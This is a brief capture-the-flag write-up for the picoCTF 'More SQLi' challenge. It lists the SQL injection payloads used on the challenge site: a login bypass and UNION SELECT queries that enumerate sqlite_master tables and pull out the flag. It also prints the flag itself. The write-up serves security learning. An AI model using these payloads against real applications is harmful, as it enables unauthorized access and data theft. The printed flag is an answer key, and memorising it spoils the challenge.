More SQLi
Author: Mubarak Mikail

Description
Can you find the flag on this website.
Try to find the flag here.



## Solution:
-`' OR 1=1 --` as password and username to login.
- discovered sqli in the search of the table and did `' UNION SELECT name, type, tbl_name FROM sqlite_master WHERE type='table' --` to get tables like more hints  and all that 

- `' UNION SELECT sql, 'x', 'y' FROM sqlite_master WHERE name='more_table' --` to get flag like strucute 
-`' UNION SELECT id, flag, 'x' FROM more_table --` to get the flag . 
- `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}`


What are these union selects ? 
-
 

